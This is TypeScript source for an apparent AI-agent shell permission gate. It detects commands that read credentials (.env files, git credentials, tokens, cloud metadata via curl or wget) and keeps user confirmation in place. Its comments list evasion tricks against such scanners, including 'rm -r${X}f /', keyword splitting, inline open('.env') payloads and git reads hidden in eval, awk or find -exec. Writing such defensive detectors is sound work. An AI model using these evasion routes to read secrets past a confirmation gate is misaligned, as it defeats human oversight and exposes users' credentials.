  if (sub === 'credential' || sub.startsWith('credential-')) return true;
  if (sub === 'var') return true;
  if (sub === 'remote') {
    const action = args.find((arg) => !arg.startsWith('-'));
    return action === 'get-url' || action === 'show'
      || (action === undefined && args.some((arg) => arg === '-v' || arg === '--verbose'));
  }
  if (sub !== 'config') return false;
  if (args.some((arg) => GIT_CONFIG_READS.test(arg))) return true;
  if (args.some((arg) => GIT_CONFIG_WRITES.has(arg))) return false;
  if (args.some((arg) => arg.startsWith('-') && arg !== '--')) return true;
  const positionals = args.filter((arg) => !arg.startsWith('-')).length;
  return positionals <= 1;
}


/**
 * 一段命令里会打出 git 配置或保存的凭证的调用(gitPrintsConfig)。全局选项超出已知范围时
 * parseGitInvocation 认不出子命令，这里退一步粗找子命令名，目录按认不出(调用方据此按读取凭证处理)。
 */
function gitConfigReadOf(
  tokens: string[],
  workspaceRoots: string[],
  opts: ShellReviewOptions,
  segmentCwd: string | undefined,
): GitRead | null {
  if (executableName(tokens[0]! ?? '') !== 'git') return { sub: 'credential', args: tokens.slice(1), cwd: segmentCwd };
  const invocation = parseGitInvocation(tokens, workspaceRoots, opts);
  if (invocation?.sub) {
    return gitPrintsConfig(invocation.sub, invocation.args)
      ? {
        sub: invocation.sub,
        args: invocation.args,
        cwd: gitUsesConfigOverride(tokens) ? undefined : gitInvocationCwd(tokens, segmentCwd),
      }
      : null;
  }
  for (let index = 1; index < tokens.length; index += 1) {
    const token = tokens[index]!;
    if (GIT_GLOBAL_VALUE_OPTIONS.has(token)) {
      index += 1;
      continue;
    }
    if (token.startsWith('-')) continue;
    const args = tokens.slice(index + 1);
    return gitPrintsConfig(token, args) ? { sub: token, args } : null;
  }
  return null;
}


/**
 * 这些 Git 全局选项会在本次调用里改变仓库上下文、配置来源或配置值。执行器的核实命令不带它们，
 * 因而不能把核实结果套到实际调用上；分享任务直接保留凭证确认卡。
 */
function gitUsesConfigOverride(tokens: readonly string[]): boolean {
  for (let index = 1; index < tokens.length; index += 1) {
    const token = tokens[index]!;
    if (token === '--') break;
    if (token === '--bare') return true;
    if (token === '-c' || token.startsWith('-c') && !token.startsWith('-C')) return true;
    if (token === '--config-env' || token.startsWith('--config-env=')) return true;
  }
  return false;
}


/**
 * 凭证核实发生在整条 shell 命令执行之前。前面的段如果会写工作区、索引或 git 引用，
 * 后面的 git diff / git show 等读取看到的状态就不是核实时的状态。只有能静态证明
 * 前置段按只读命令执行时，才允许把这次读取交给执行器做本机凭证豁免；认不出的段一律
 * 按可能有副作用处理，保持 fail-closed。
 */
function shellSegmentMutation(
  segments: readonly ExecutableSegment[],
  index: number,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
  segmentCwds: readonly (string | undefined)[],
): { mayMutate: boolean; mayMutateFiles: boolean } {
  const segment = segments[index]!;
  const segmentCwd = segmentCwds[index]!;
  const segmentOpts: ShellReviewOptions = {
    ...opts,
    cwd: segmentCwd ?? opts.cwd,
    cwdUnknown: segmentCwd === undefined ? true : opts.cwdUnknown,
  };
  // git status may refresh the index, so it cannot establish a stable pre-read state
  // for a later credential exemption even though its output is otherwise read-only.
  const tokens = stripShellControlTokens(tokenize(segment.text));
  const unwrapped = unwrapCommand(tokens, segmentOpts.cwd ?? workspaceRoots[0]!, segmentOpts.cwdUnknown === true);
  const resolvedDirectoryChange = !process.env.CDPATH
    && tokens[0]! === 'cd' && tokens.length === 2 && !tokens[1]!.startsWith('-')
    && segment.separatorAfter === 'and' && segmentCwds[index + 1]! !== undefined
    && !segmentHasSideEffectRedirectOrSubstitution(segment.text);
  const invocation = unwrapped.tokens[0]! && executableName(unwrapped.tokens[0]!) === 'git'
    ? parseGitInvocation(unwrapped.tokens, workspaceRoots, segmentOpts)
    : undefined;
  const mayMutate = invocation?.sub === 'status'
    || classifyShellSegment(segment.text, workspaceRoots, segmentOpts) !== 'auto-approve';
  return { mayMutate, mayMutateFiles: mayMutate && !resolvedDirectoryChange };
}


/**
 * Inline interpreter payloads are code rather than ordinary file operands. A credential
 * basename can therefore be surrounded by call syntax (`open(".env").read()`) and
 * bypass the reader-argument parser. Split the payload at code punctuation and apply the
 * same path matcher to each literal-looking fragment; this is deliberately fail-closed.
 */
function inlinePayloadMentionsCredentialPath(payload: string): boolean {
  return payload
    .split(/[\s'"`(){};|&=,]+/)
    .some((candidate) => candidate.length > 0 && isSensitiveCredentialPath(candidate));
}


function shellCommandReadsDotenv(
  command: string,
  workspaceRoots: string[],
  opts: CredentialCommandOptions,
  depth = 0,
): boolean {
  if (depth >= MAX_EXEC_REVIEW_DEPTH) return true;
  const credentialText = opts.credentialTextTransform ?? ((text: string) => text);
  const selectorMatcher = opts.sourceFileSelectors ? shareSelectorCouldMatchCredential : selectorCouldMatchCredential;
  const selectorCouldMatch = (value: string) => selectorMatcher(credentialText(value));
  const segments = splitExecutableSegments(command);
  // 调用方核实 Git 或文件读取时需要各段的实际目录。
  const segmentCwds = opts.gitContentRead || opts.gitConfigRead || opts.fileReadRequiresConsent
    ? segmentWorkingDirs(segments, workspaceRoots, opts) : [];
  const sharesGitCredentialChecks = opts.gitContentRead !== undefined || opts.gitConfigRead !== undefined;
  let previousMayMutate = false;
  let previousMayMutateFiles = false;
  for (const [segmentIndex, { text: segment }] of segments.entries()) {
    // Accumulate the prefix once, instead of reclassifying all prior segments for
    // every read. Updating at entry also covers earlier segments that continued.
    // File checks may accept a resolved cd; Git checks retain the stricter state.
    if (segmentIndex > 0 && (sharesGitCredentialChecks || opts.fileReadRequiresConsent)
      && (!previousMayMutate || (opts.fileReadRequiresConsent && !previousMayMutateFiles))) {
      const previous = shellSegmentMutation(segments, segmentIndex - 1, workspaceRoots, opts, segmentCwds);
      previousMayMutate ||= previous.mayMutate;
      previousMayMutateFiles ||= previous.mayMutateFiles;
    }
    const inputRedirections = parseShellInputRedirections(segment);
    if (inputRedirections.hasUnresolvedTarget) return true;
    const inspectionCommand = inputRedirections.targets.length > 0
      ? parseShellInputRedirections(segment, true).command
      : inputRedirections.command;
    const rawTokens = tokenize(inspectionCommand);
    const unwrapped = unwrapCommand(
      stripShellControlTokens(rawTokens),
      opts.cwd ?? workspaceRoots[0]!,
      opts.cwdUnknown === true,
    );
    const tokens = unwrapped.tokens;
    const bin = executableName(tokens[0]! ?? '');
    const configOverride = bin === 'git' && gitUsesConfigOverride(tokens);
    const priorMutation = sharesGitCredentialChecks || opts.fileReadRequiresConsent
      ? previousMayMutate
        || segmentHasSideEffectRedirectOrSubstitution(segment)
        || configOverride
      : false;
    const priorFileMutation = opts.fileReadRequiresConsent
      ? previousMayMutateFiles
        || segmentHasSideEffectRedirectOrSubstitution(segment)
        || rawTokens[0]! !== tokens[0]!
      : false;
    const fileReadRequiresConsent = opts.fileReadRequiresConsent
      ? (operand: string) => opts.fileReadRequiresConsent!({
        operand,
        cwd: depth === 0 ? segmentCwds[segmentIndex]! : undefined,
        priorSegmentsMayMutate: priorFileMutation,
      }) : undefined;
    const readsCredentialInput = inputRedirections.targets.some((target) => fileReadRequiresConsent
      ? fileReadRequiresConsent(target)
      : shellOperandCouldMatchDotenv(credentialText(target)));
    if (fileReadRequiresConsent && readsCredentialInput) return true;

    // xargs and parallel construct the real argv from stdin. The command that eventually reads
    // a repository or credential file is therefore outside this static scan; shared-provider
    // tasks must keep the confirmation card instead of granting a pre-read exemption.
    if (sharesGitCredentialChecks && (bin === 'xargs' || bin === 'parallel')) return true;
    // env -S/--split-string reparses an inline command string. The wrapper deliberately stays
    // unexpanded here, so a nested Git read cannot be tied to the pre-read repository state.
    if (sharesGitCredentialChecks && executableName(rawTokens[0]! ?? '') === 'env'
      && rawTokens.slice(1).some((token) => token === '-S' || token === '--split-string' || token.startsWith('--split-string='))) return true;

    // The outer command may only print a substitution or process-substitution result, while the
    // nested Git invocation reads the repository (echo "$(git diff)" / cat "<(git diff)"). Likewise,
    // an inline shell/interpreter payload, eval/awk dynamic command, or find -exec can hide the
    // Git read without a separate top-level segment. These commands are intentionally kept behind
    // the confirmation card: the pre-read cannot prove the nested execution context or cwd.
    const nestedCredentialPayloads = new Set<string>();
    const addNestedPayload = (payload: string | null | undefined): void => {
      if (typeof payload === 'string' && payload.trim().length > 0) nestedCredentialPayloads.add(payload);
    };
    addNestedPayload(shellCommandPayload(rawTokens));
    addNestedPayload(interpreterInlineCodePayload(rawTokens));
    addNestedPayload(shellSourceSelectorPayload(rawTokens));
    // Transparent launchers (env/timeout/busybox/command) are unwrapped above;
    // inspect the resulting argv too so their shell/interpreter payload remains
    // inside the shared-provider credential gate.
    addNestedPayload(shellCommandPayload(tokens));
    addNestedPayload(interpreterInlineCodePayload(tokens));
    addNestedPayload(shellSourceSelectorPayload(tokens));
    for (const body of substitutionBodies(segment)) addNestedPayload(body);
    if (executableName(rawTokens[0]! ?? '') === 'eval') addNestedPayload(rawTokens.slice(1).join(' '));
    if (executableName(rawTokens[0]! ?? '') === 'awk'
      && AWK_SCRIPT_EXECUTES_COMMANDS.test(rawTokens.slice(1).join(' '))) {
      addNestedPayload(rawTokens.slice(1).join(' '));
    }
    if (executableName(rawTokens[0]! ?? '') === 'find') {
      for (const { argv } of findExecCommands(rawTokens)) addNestedPayload(shellQuoteArgvForReview(argv));
    }
    const hasGitInvocationText = /\bgit(?:\.exe)?(?:-credential[\w-]*)?\b/i.test(segment);
    const hasNestedGitInvocation = [...nestedCredentialPayloads]
      .some((payload) => /\bgit(?:\.exe)?(?:-credential[\w-]*)?\b/i.test(payload));
    if (sharesGitCredentialChecks && hasGitInvocationText
      && executableName(rawTokens[0]! ?? '') !== 'git'
      && (hasNestedGitInvocation || nestedCredentialPayloads.size > 0)) return true;

    // Only sharing callers request these extra nested checks. Local Auto and
    // same-account remote commands retain their existing classification.
    if (sharesGitCredentialChecks || opts.fileReadRequiresConsent) {
      for (const payload of nestedCredentialPayloads) {
        // Inline programs are not shell argv: keep paths in e.g. Python
        // open(".env") visible before recursively checking shell payloads.
        if (inlinePayloadMentionsCredentialPath(opts.fileReadRequiresConsent ? payload : credentialText(payload))) return true;
        if (shellCommandReadsCredentials(payload, workspaceRoots, opts, depth + 1)) return true;
      }
    }

    if (opts.gitConfigRead && (bin === 'git' || bin.startsWith('git-credential'))) {
      const read = gitConfigReadOf(tokens, workspaceRoots, opts, segmentCwds[segmentIndex]!);
      if (read && !opts.gitConfigRead({
        ...read,
        priorSegmentsMayMutate: priorMutation,
        usesInheritedGitRuntime: rawTokens[0]! === 'git',
      })) return true;
    }

    if (bin === 'git') {
      const invocation = parseGitInvocation(tokens, workspaceRoots, opts);
      if (!invocation?.sub || !SAFE_GIT_SUBCOMMANDS.has(invocation.sub)) {
        if (sharesGitCredentialChecks && !invocation?.sub
          && tokens.slice(1).some((arg) => /^(?:diff|show|log|whatchanged|grep|cat-file|status|blame)$/.test(arg))) return true;
        continue;
      }
      const credentialArgs = invocation.args.map(credentialText);
      if (readsCredentialInput) return true;
      if (invocation.sub === 'grep') {
        if (gitGrepExpandsSearchScope(invocation.args)) return true;
        if (readerArgumentsReadDotenv('grep', fileReadRequiresConsent ? invocation.args : credentialArgs,
          (operand) => isGitDotenvOperand(credentialText(operand)), opts.platform ?? process.platform,
          selectorCouldMatch, fileReadRequiresConsent, false)) return true;
      } else if ((invocation.sub === 'blame' && gitBlameContentsReadDotenv(invocation.args,
        fileReadRequiresConsent ?? ((operand) => shellOperandCouldMatchDotenv(credentialText(operand)))))
        || ((invocation.sub === 'log' || invocation.sub === 'whatchanged' || invocation.sub === 'show')
          && gitLineRangeReadsDotenv(credentialArgs))
        || gitArgumentsReadDotenv(credentialArgs)) {
        return true;
      }
      const probesShowObject = opts.gitContentRead !== undefined && invocation.sub === 'show'
        && !gitShowHasOnlySafeObjectPaths(invocation.args);
      // Merge-diff modes can imply -p; treat long-option prefixes conservatively
      // too. Sharing probes must not grant the metadata-only exemption.
      // Keep the existing local / same-account classifier unchanged.
      const probesMergePatch = sharesGitCredentialChecks
        && /^(?:log|show|whatchanged)$/.test(invocation.sub)
        && invocation.args.some((arg, index, args) => {
          const name = arg.split('=')[0]!;
          if (!name.startsWith('--') || name.length <= 2) return false;
          if (['--remerge-diff', '--dd'].some((option) => option.startsWith(name))) return true;
          const mode = arg.includes('=') ? arg.slice(arg.indexOf('=') + 1) : args[index + 1]!;
          return '--diff-merges'.startsWith(name) && mode !== 'off' && mode !== 'none';
        });
      // Whitespace diagnostics print offending source lines even without -p,
      // including when --check is combined with a metadata output flag.
      const probesWhitespaceContent = sharesGitCredentialChecks
        && /^(?:diff|log|show|whatchanged)$/.test(invocation.sub)
        && invocation.args.includes('--check');
      const readsContent = gitContentReadWithoutPath(invocation.sub, invocation.args)
        || probesShowObject || probesMergePatch || probesWhitespaceContent;
      const probesRuntime = opts.gitContentRead !== undefined
        && /^(?:diff|show|log|whatchanged|grep|cat-file|status|blame|ls-files|check-ignore)$/.test(invocation.sub);
      const checksContent = readsContent || probesRuntime || (sharesGitCredentialChecks
        && /^(?:diff|show|log|whatchanged|grep|cat-file|status|blame)$/.test(invocation.sub));
      const canProbe = checksContent && classifyGit(tokens, segment, workspaceRoots, opts) === 'auto-approve';
      if (checksContent && sharesGitCredentialChecks && !canProbe) return true;
      if ((readsContent || probesRuntime) && canProbe && !opts.gitContentRead?.({
          sub: invocation.sub,
          args: invocation.args,
          cwd: configOverride ? undefined : gitInvocationCwd(tokens, segmentCwds[segmentIndex]!),
          priorSegmentsMayMutate: priorMutation,
          usesInheritedGitRuntime: rawTokens[0]! === 'git',
          ...(!readsContent ? { metadataOnly: true } : {}),
        })) return true;
      continue;
    }

    if (!DOTENV_FILE_READER_BINS.has(bin)) {
      if (fileReadRequiresConsent && credentialText(segment) !== segment) return true;
      continue;
    }
    if (readsCredentialInput) return true;
    const args = tokens.slice(1);
    if (opts.sourceFileSelectors && bin === 'rg' && ripgrepMayRunPreprocessor(args)) return true;
    if (opts.sourceFileSelectors && searchFollowsSymlinks(bin, args)) return true;
    if (opts.sourceFileSelectors && bin === 'rg'
      && (opts.ripgrepConfigActive || /\bRIPGREP_CONFIG_PATH\s*=/i.test(command))
      && args[0]! !== '--no-config') return true;
    const readerArgs = opts.sourceFileSelectors && bin === 'rg' && args[0]! === '--no-config'
      ? args.slice(1) : args;
    if (grepRecursesIntoPotentialDotenv(bin, args, selectorCouldMatch)) return true;
    if (bin === 'ag' && agSearchesPotentialCredential(args)) return true;
    if (bin === 'rg' && rgSearchesPotentialDotenv(args, selectorCouldMatch)) return true;
    if (readerArgumentsReadDotenv(
      bin, readerArgs, isDotenvCredentialPath, opts.platform ?? process.platform,
      selectorCouldMatch, fileReadRequiresConsent)) return true;
  }
  return false;
}


/**
 * 确定性红线的扫描面：结构上确定是数据的引号字面量先换成占位符(stripDataLiterals)，再生成防拆词
 * 绕过的各个变体(各变体的用途见 classifyShellCommand 里的说明)。
 */
function deterministicScanVariants(command: string): {
  deEscaped: string;
  quotesOnly: string;
  deGlobbed: string;
  deExpanded: string;
  deExpandedGlob: string;
  deSubstituted: string;
} {
  const scannable = stripDataLiterals(command);
  const deEscaped = scannable.replace(/['"\\]/g, '');
  const quotesOnly = scannable.replace(/['"]/g, '');
  const deGlobbed = deEscaped.replace(/[[\]{}*?]/g, '');
  // deExpanded:抹掉参数展开(见 stripExpansions)—— 防 `s${X}udo`/`rm -r${X}f /` 这类把关键词拆开、
  // bash 展开成空后才成形的绕过。**必须从 deEscaped 派生**(保留 `${...}` 完整):若先去 glob 会把
  // `${X}` 的 `{}` 抹成 `$X`,再 stripExpansions 会把 `$Xudo` 整词吞掉、反而复原不出 `sudo`。
  // deExpandedGlob:再叠加去 glob,覆盖 `${X}` 与 `[h]` 混用的组合变形。
  const deExpanded = stripExpansions(deEscaped);
  const deExpandedGlob = deExpanded.replace(/[[\]{}*?]/g, '');
  // deSubstituted:把 `${X:-sudo}` 等默认值代入,让藏在展开默认值里的危险关键词现形(codex 报)。
  const deSubstituted = substituteDefaults(deEscaped);
  return { deEscaped, quotesOnly, deGlobbed, deExpanded, deExpandedGlob, deSubstituted };
}


/** curl / wget 抓云 metadata(读实例临时云凭证)。 */
function fetchesCloudMetadata(quotesOnly: string): boolean {
  for (const { text } of splitExecutableSegments(quotesOnly)) {
    const tokens = unwrapWrappers(tokenize(text));
    const bin = executableName(tokens[0]! ?? '');
    if (bin !== 'curl' && bin !== 'wget') continue;
    if (tokens.slice(1).some((t) => isFetchTargetToken(t) && isCloudMetadataFetchTarget(t))) {
      return true;
    }
  }
  return false;
}


function matchesAnyVariant(patterns: readonly CommandScanPattern[], variants: ReturnType<typeof deterministicScanVariants>): boolean {
  const texts = Object.values(variants);
  return patterns.some((re) => texts.some((text) => re.test(text)));
}


/**
 * 命令是否静态可证地读取或打出可复用凭证：读凭证 / 密钥文件(含 .env)、钥匙串、令牌类环境变量、
 * `gh auth token`、抓云 metadata。是 classifyShellCommand「必问」判据里凭证的那一部分，供应商分享的
 * 受邀者任务在完全访问下也要确认这一类。只看命令文本：脚本文件里读的、编码后再解开的认不出来。
 */
export function shellCommandReadsCredentials(
  command: string,
  workspaceRoots: string[],
  opts: CredentialCommandOptions = {},
  depth = 0,
): boolean {
  if (typeof command !== 'string' || command.trim().length === 0) return false;
  // 确定性扫描与模型审阅的 4096 字符预算无关。普通长编辑脚本不能仅因长度
  // 被当作凭证读取；仍扫描完整文本，独立上限用于限制解析资源消耗。
  if (command.length > 256 * 1024) return true;
  if (shellCommandReadsDotenv(command, workspaceRoots, opts, depth)) return true;
  const variants = deterministicScanVariants(opts.credentialTextTransform?.(command) ?? command);
  return matchesAnyVariant(CREDENTIAL_ALWAYS_ASK_PATTERNS, variants) || fetchesCloudMetadata(variants.quotesOnly);
}


// ─────────────────────────── 路径边界 ───────────────────────────

/**
 * 反斜杠转正斜杠(Windows / 混合分隔符),统一按 `/` 分量判定。POSIX 下含字面反斜杠的文件名
 * 极罕见,归一化成分隔符只会让边界判定更保守(fail-closed 方向),不会放宽越界。
 */
function toForwardSlashes(p: string): string {
  return p.replace(/\\/g, '/');
}


/**
 * 绝对路径判定(平台无关):POSIX `/…` 或任意 Windows 盘符前缀 `C:…`。入参须已 toForwardSlashes。
 * 盘符相对路径(`C:..\Windows`、`C:file` —— 合法但**非**绝对)也算在内:目的不是判"绝对",而是
 * 判"不可安全地拼到 cwd"——盘符前缀一旦拼 cwd 再折叠 `..`,可能字符串前缀误命中工作区而误放行。
 * 故任何 `^[A-Za-z]:` 都不拼 cwd,交 normalizeSlashes/isInsideWorkspace 判,盘符相对路径 fail-closed 到 prompt。
 */
function isAbsolutePath(p: string): boolean {
  return p.startsWith('/') || /^[A-Za-z]:/.test(p);
}


function trimTrailingSlashes(value: string): string {
  let end = value.length;
  while (end > 0 && value[end - 1]! === '/') end--;
  return value.slice(0, end);
}


/** 归一化路径:去包裹引号、统一分隔符,相对路径挂到第一个 workspace root(cwd)。 */
function normalizeTarget(target: string, workspaceRoots: string[]): string {
  let p = toForwardSlashes(target.replace(/^['"]|['"]$/g, ''));
  if (!isAbsolutePath(p)) {
    const cwd = workspaceRoots[0]!;
    if (cwd) p = `${trimTrailingSlashes(toForwardSlashes(cwd))}/${p.replace(/^\/+/, '')}`;
  }
  return normalizeSlashes(p);
}


/**
 * 折叠 `.`/`..`/重复分隔符,得到规范绝对路径的字符串形态(不触文件系统)。兼容 Windows 盘符前缀
 * `C:`(大小写归一到大写,避免 `C:` vs `c:` 误判;盘符后路径体在 Windows 上大小写不敏感,此处保留
 * 原样只会导致 body 大小写不一致时**过度升级**,是 fail-closed 方向,不会放宽越界)。
 */
function normalizeSlashes(p: string): string {
  const fwd = toForwardSlashes(p);
  const drive = (/^([A-Za-z]:)\//.exec(fwd)?.[1] ?? '').toUpperCase(); // Windows 盘符,如 C:
  const isAbs = fwd.startsWith('/') || drive !== '';
  const parts = (drive ? fwd.slice(drive.length) : fwd).split('/');
  const out: string[] = [];
  for (const part of parts) {
    if (part === '' || part === '.') continue;
    if (part === '..') {
      if (out.length > 0 && out[out.length - 1]! !== '..') out.pop();
      else if (!isAbs) out.push('..');
      // 绝对路径(或盘符根)下越过根的 `..` 丢弃。
    } else {
      out.push(part);
    }
  }
  const prefix = drive ? `${drive}/` : isAbs ? '/' : '';
  return prefix + out.join('/');
}


/**
 * 抹平 macOS firmlink:`/private/{var,tmp,etc}` 与 `/{var,tmp,etc}` 是同一物理位置。工具解析出的
 * 绝对路径常带 `/private` 前缀,而 cwd 可能不带 —— 不抹平会把区内写误判成越界。纯字符串,不碰
 * 文件系统(远端路径无 macOS firmlink,原样通过)。
 */
function canonicalPath(p: string, aliasFirmlinks: boolean): string {
  const n = normalizeSlashes(p);
  if (!aliasFirmlinks) return n; // 非 macOS:/private/tmp 与 /tmp 是不同路径,不抹平
  const m = /^\/private(\/(?:var|tmp|etc)(?:\/|$))/.exec(n);
  return m ? n.slice('/private'.length) : n;
}
